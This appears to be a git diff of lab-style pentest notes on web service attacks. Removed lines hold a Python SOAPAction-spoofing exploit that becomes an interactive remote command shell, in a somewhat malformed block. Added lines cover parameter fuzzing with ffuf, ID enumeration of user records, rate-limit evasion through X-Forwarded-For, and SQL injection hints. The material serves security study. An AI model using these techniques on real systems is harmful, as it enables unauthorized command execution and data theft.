@@ -135,28 +135,9 @@ If the server only checks the SOAPAction header, it may be possible to spoof a r
 <img width="812" height="572" alt="image" src="https://github.com/user-attachments/assets/e7f6f780-aee8-411c-a6ff-e334957c7d0c" />
 
 
-```python
-
 **1. Normal Request (Blocked)**
 
-import requests
-
-payload = '''<?xml version="1.0" encoding="utf-8"?>
-<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" 
-  xmlns:tns="http://tempuri.org/">
-  <soap:Body>
-    <ExecuteCommandRequest xmlns="http://tempuri.org/">
-      <cmd>whoami</cmd>
-    </ExecuteCommandRequest>
-  </soap:Body>
-</soap:Envelope>'''
-
-print(requests.post(
-    "http://<TARGET IP>:3002/wsdl",
-    data=payload,
-    headers={"SOAPAction": '"ExecuteCommand"'}
-).content)
-
+<img width="746" height="550" alt="image" src="https://github.com/user-attachments/assets/6f604383-1d06-440d-80b7-dfc4a6b798b1" />
 
 Result: "This function is only allowed in internal networks"
 
@@ -164,47 +145,62 @@ Result: "This function is only allowed in internal networks"
 
 We put a harmless operation (LoginRequest) in the body, but keep the SOAPAction as ExecuteCommand.
 
-```python
-import requests
-
-payload = '''<?xml version="1.0" encoding="utf-8"?>
-<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"
-  xmlns:tns="http://tempuri.org/">
-  <soap:Body>
-    <LoginRequest xmlns="http://tempuri.org/">
-      <cmd>whoami</cmd>
-    </LoginRequest>
-  </soap:Body> ```
+<img width="757" height="338" alt="image" src="https://github.com/user-attachments/assets/87d42f0f-9944-40ed-8198-3b4d581f97c1" />
 
 **3.Interactive Exploit Script**
 
-import requests
-
-while True:
-    cmd = input("$ ")
-    payload = f'''<?xml version="1.0" encoding="utf-8"?>
-<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"
-  xmlns:tns="http://tempuri.org/">
-  <soap:Body>
-    <LoginRequest xmlns="http://tempuri.org/">
-      <cmd>{cmd}</cmd>
-    </LoginRequest>
-  </soap:Body>
-</soap:Envelope>'''
-    r = requests.post(
-        "http://<TARGET IP>:3002/wsdl",
-        data=payload,
-        headers={"SOAPAction": '"ExecuteCommand"'}
-    )
-    print(r.content)
-</soap:Envelope>'''
-
-<pre>print(requests.post(
-    "http://<TARGET IP>:3002/wsdl",
-    data=payload,
-    headers={"SOAPAction": '"ExecuteCommand"'}
-).content)</pre>
-
+<img width="737" height="656" alt="image" src="https://github.com/user-attachments/assets/d3f0611e-4853-400c-964a-edbffe4e92bb" />
 
 Result: Command executed successfully — restriction bypassed.
 
+
+# Info Disclosure
+
+**Information Disclosure (with a twist of SQLi)**
+
+APIs or web services may leak information due to misconfigurations or insufficient input validation. Fuzzing parameters is a good starting point.
+
+## Parameter Fuzzing
+
+**Use ffuf with a parameter wordlist to find interesting parameters:**
+
+`ffuf -w burp-parameter-names.txt -u 'http://<TARGET IP>:3003/?FUZZ=test_value' -fs 19`
+
+`-fs 19` filters out responses with default size (non-interesting responses).
+
+Example result: parameter id is valid.
+
+**Check a valid parameter:**
+
+`curl http://<TARGET IP>:3003/?id=1`
+
+Response:
+
+`[{"id":"1","username":"admin","position":"1"}]`
+
+
+## Automating Data Retrieval
+
+Python script to iterate over IDs:
+
+<img width="451" height="280" alt="image" src="https://github.com/user-attachments/assets/f38f9554-2b26-42e2-ade7-52cdd7bbab8d" />
+
+Run it:
+
+`python3 brute_api.py http://<TARGET IP>:3003`
+
+Output:
+
+<pre>Number found! 1
+[{"id":"1","username":"admin","position":"1"}]
+Number found! 2
+[{"id":"2","username":"HTB-User-John","position":"2"}]
+...</pre>
+
+## Tips
+
+APIs may have rate limits; bypass with headers like X-Forwarded-For:
+
+<img width="557" height="167" alt="image" src="https://github.com/user-attachments/assets/d1c5eae1-8e54-4340-bf74-9cc23a66b4cc" />
+
+SQL Injection can also target parameters like id. Test classic payloads.
